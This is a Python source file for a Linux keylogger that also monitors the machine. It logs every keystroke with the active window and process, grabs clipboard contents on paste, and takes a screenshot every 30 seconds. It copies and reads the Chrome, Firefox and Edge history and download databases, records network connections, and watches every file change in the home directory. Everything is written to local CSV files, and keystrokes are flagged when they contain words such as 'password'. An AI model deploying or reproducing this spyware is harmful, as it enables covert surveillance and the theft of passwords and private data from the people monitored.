import os
import getpass
import pyperclip
import psutil
import platform
import socket
import csv
import subprocess
import requests
import time
import threading
import sqlite3
import shutil
from datetime import datetime
from pynput import keyboard
from mss import mss
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

LOG_DIR = os.path.expanduser("~/projects/keylogger_max/output")
KEY_LOG_FILE = os.path.join(LOG_DIR, "activity.csv")
NETWORK_LOG_FILE = os.path.join(LOG_DIR, "network_activity.csv")
BROWSER_LOG_FILE = os.path.join(LOG_DIR, "browser_history.csv")
FILESYSTEM_LOG_FILE = os.path.join(LOG_DIR, "filesystem_activity.csv")
SCREENSHOT_DIR = os.path.join(LOG_DIR, "screenshots")
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Collect system-wide metadata
USER = getpass.getuser()
HOST = socket.gethostname()
OS_NAME = f"{platform.system()} {platform.release()}"
try:
    PUBLIC_IP = requests.get("https://api.ipify.org", timeout=5).text
except:
    PUBLIC_IP = "Unavailable"

# Key buffer to detect paste
last_keys = []

# Ensure key log file has headers
if not os.path.exists(KEY_LOG_FILE):
    with open(KEY_LOG_FILE, "w", newline='', encoding="utf-8") as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerow([
            "timestamp", "user", "public_ip", "hostname", "os",
            "pid", "exe_path", "window_title", "key", "clipboard"
        ])

# Ensure network log file has headers
if not os.path.exists(NETWORK_LOG_FILE):
    with open(NETWORK_LOG_FILE, "w", newline='', encoding="utf-8") as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerow([
            "timestamp", "pid", "process_name", "local_address", "remote_address", "status"
        ])

# Ensure browser history log file has headers
if not os.path.exists(BROWSER_LOG_FILE):
    with open(BROWSER_LOG_FILE, "w", newline='', encoding="utf-8") as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerow(["timestamp", "source", "title", "url", "visit_count", "last_visit_time"])

# Ensure filesystem log file has headers
if not os.path.exists(FILESYSTEM_LOG_FILE):
    with open(FILESYSTEM_LOG_FILE, "w", newline='', encoding="utf-8") as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerow(["timestamp", "event_type", "src_path", "dest_path", "is_directory"])

def get_active_window_info():
    try:
        win_id = subprocess.check_output(["xdotool", "getactivewindow"]).decode().strip()
        window_title = subprocess.check_output(["xdotool", "getwindowname", win_id]).decode().strip()
        pid = subprocess.check_output(["xdotool", "getwindowpid", win_id]).decode().strip()
        exe_path = psutil.Process(int(pid)).exe()
        return window_title, pid, exe_path
    except Exception:
        return "UNKNOWN", "-1", "UNKNOWN"

def log_network_activity():
    while True:
        try:
            with open(NETWORK_LOG_FILE, "a", newline='', encoding="utf-8") as f:
                writer = csv.writer(f, quoting=csv.QUOTE_ALL)
                for conn in psutil.net_connections(kind='inet'):
                    if conn.status == 'ESTABLISHED' and conn.raddr:
                        try:
                            proc = psutil.Process(conn.pid)
                            proc_name = proc.name()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            proc_name = "N/A"
                        
                        writer.writerow([
                            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            conn.pid,
                            proc_name,
                            f"{conn.laddr.ip}:{conn.laddr.port}",
                            f"{conn.raddr.ip}:{conn.raddr.port}",
                            conn.status
                        ])
        except Exception as e:
            print(f"[!] Error logging network activity: {e}")
        
        time.sleep(15) # Log every 15 seconds

def capture_screenshot():
    while True:
        try:
            with mss() as sct:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
                sct.shot(output=filename)
        except Exception as e:
            print(f"[!] Error capturing screenshot: {e}")
        
        time.sleep(30) # Capture every 30 seconds

def log_browser_history():
    while True:
        try:
            with open(BROWSER_LOG_FILE, "a", newline='', encoding="utf-8") as f:
                writer = csv.writer(f, quoting=csv.QUOTE_ALL)

                # --- Chrome History ---
                chrome_history_path = os.path.expanduser("~/.config/google-chrome/Default/History")
                if os.path.exists(chrome_history_path):
                    temp_chrome_history_path = os.path.join(LOG_DIR, "ChromeHistory.db")
                    shutil.copy2(chrome_history_path, temp_chrome_history_path)
                    try:
                        with sqlite3.connect(temp_chrome_history_path) as conn:
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                            for row in cursor.fetchall():
                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome History", row[1], row[0], row[2], datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
                            cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
                            for row in cursor.fetchall():
                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Chrome Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
                    except Exception as e:
                        print(f"[!] Error reading Chrome history: {e}")
                    finally:
                        if os.path.exists(temp_chrome_history_path):
                            os.remove(temp_chrome_history_path)

                # --- Firefox History ---
                firefox_profiles_path = os.path.expanduser("~/.mozilla/firefox/")
                if os.path.exists(firefox_profiles_path):
                    for profile in os.listdir(firefox_profiles_path):
                        if ".default" in profile: # Find default profile
                            firefox_history_path = os.path.join(firefox_profiles_path, profile, "places.sqlite")
                            firefox_downloads_path = os.path.join(firefox_profiles_path, profile, "downloads.sqlite")

                            if os.path.exists(firefox_history_path):
                                temp_firefox_history_path = os.path.join(LOG_DIR, "FirefoxHistory.db")
                                shutil.copy2(firefox_history_path, temp_firefox_history_path)
                                try:
                                    with sqlite3.connect(temp_firefox_history_path) as conn:
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places")
                                        for row in cursor.fetchall():
                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox History", row[1], row[0], row[2], datetime.fromtimestamp(row[3] / 1000000)])
                                except Exception as e:
                                    print(f"[!] Error reading Firefox history: {e}")
                                finally:
                                    if os.path.exists(temp_firefox_history_path):
                                        os.remove(temp_firefox_history_path)
                            
                            if os.path.exists(firefox_downloads_path):
                                temp_firefox_downloads_path = os.path.join(LOG_DIR, "FirefoxDownloads.db")
                                shutil.copy2(firefox_downloads_path, temp_firefox_downloads_path)
                                try:
                                    with sqlite3.connect(temp_firefox_downloads_path) as conn:
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT content.url, content.suggestedFileName, content.totalBytes, content.startTime FROM moz_downloads AS content")
                                        for row in cursor.fetchall():
                                            writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Firefox Download", row[1], row[0], f"{row[2]} bytes", datetime.fromtimestamp(row[3] / 1000000)])
                                except Exception as e:
                                    print(f"[!] Error reading Firefox downloads: {e}")
                                finally:
                                    if os.path.exists(temp_firefox_downloads_path):
                                        os.remove(temp_firefox_downloads_path)

                # --- Edge History (similar to Chrome) ---
                edge_history_path = os.path.expanduser("~/.config/microsoft-edge/Default/History")
                if os.path.exists(edge_history_path):
                    temp_edge_history_path = os.path.join(LOG_DIR, "EdgeHistory.db")
                    shutil.copy2(edge_history_path, temp_edge_history_path)
                    try:
                        with sqlite3.connect(temp_edge_history_path) as conn:
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                            for row in cursor.fetchall():
                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge History", row[1], row[0], row[2], datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
                            cursor.execute("SELECT tab_url, target_path, total_bytes, start_time FROM downloads")
                            for row in cursor.fetchall():
                                writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Edge Download", os.path.basename(row[1]), row[0], f"{row[2]} bytes", datetime.fromtimestamp(row[3] / 1000000 - 11644473600)])
                    except Exception as e:
                        print(f"[!] Error reading Edge history: {e}")
                    finally:
                        if os.path.exists(temp_edge_history_path):
                            os.remove(temp_edge_history_path)

        except Exception as e:
            print(f"[!] General error logging browser history: {e}")
        
        time.sleep(60) # Log every 60 seconds

class FileSystemLogger(FileSystemEventHandler):
    def __init__(self, log_file):
        self.log_file = log_file

    def _log(self, event_type, src_path, dest_path=None, is_directory=False):
        with open(self.log_file, "a", newline='', encoding="utf-8") as f:
            writer = csv.writer(f, quoting=csv.QUOTE_ALL)
            writer.writerow([
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                event_type,
                src_path,
                dest_path if dest_path else "",
                str(is_directory)
            ])

    def on_created(self, event):
        self._log("created", event.src_path, is_directory=event.is_directory)

    def on_deleted(self, event):
        self._log("deleted", event.src_path, is_directory=event.is_directory)

    def on_modified(self, event):
        self._log("modified", event.src_path, is_directory=event.is_directory)

    def on_moved(self, event):
        self._log("moved", event.src_path, event.dest_path, is_directory=event.is_directory)

def start_filesystem_monitoring():
    event_handler = FileSystemLogger(FILESYSTEM_LOG_FILE)
    observer = Observer()
    observer.schedule(event_handler, os.path.expanduser("~"), recursive=True)
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

def format_key(key):
    """Formats the key event to a string, handling special keys."""
    if hasattr(key, 'char') and key.char:
        return key.char
    else:
        return str(key)

SENSITIVE_KEYWORDS = ["password", "secret", "confidential", "private key", "ssn", "credit card"]

def log_event(key):
    global last_keys
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    window_title, pid, exe_path = get_active_window_info()
    key_str = format_key(key)
    
    clipboard = ""
    # Check for paste (Ctrl+V)
    if key_str == 'v' and (keyboard.Key.ctrl_l in last_keys or keyboard.Key.ctrl_r in last_keys):
        try:
            clipboard = pyperclip.paste()
        except Exception:
            clipboard = "[Error Reading Clipboard]"

    row = [
        timestamp, USER, PUBLIC_IP, HOST, OS_NAME,
        pid, exe_path, window_title, key_str, clipboard
    ]

    with open(KEY_LOG_FILE, "a", newline='', encoding="utf-8") as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerow(row)

    # Check for sensitive keywords
    for keyword in SENSITIVE_KEYWORDS:
        if keyword in key_str.lower():
            print(f"[!!! ALERT !!!] Sensitive keyword '{keyword}' detected in keystroke: {key_str}")

    # Maintain buffer of last keys
    last_keys.append(key)
    if len(last_keys) > 10:
        last_keys.pop(0)

if __name__ == "__main__":
    # Start network logger in a background thread
    network_thread = threading.Thread(target=log_network_activity, daemon=True)
    network_thread.start()

    # Start screenshot capture in a background thread
    screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
    screenshot_thread.start()

    # Start browser history logger in a background thread
    browser_thread = threading.Thread(target=log_browser_history, daemon=True)
    browser_thread.start()

    # Start filesystem monitoring in a background thread
    filesystem_thread = threading.Thread(target=start_filesystem_monitoring, daemon=True)
    filesystem_thread.start()
    
    print(f"[+] Keylogger started at {datetime.now()}... Logging to {KEY_LOG_FILE}")
    print(f"[+] Network monitor started... Logging to {NETWORK_LOG_FILE}")
    print(f"[+] Screenshot capture started... Saving to {SCREENSHOT_DIR}")
    print(f"[+] Browser history monitor started... Logging to {BROWSER_LOG_FILE}")
    print(f"[+] File system monitor started... Logging to {FILESYSTEM_LOG_FILE}")

    with keyboard.Listener(on_press=log_event) as listener:
        listener.join()

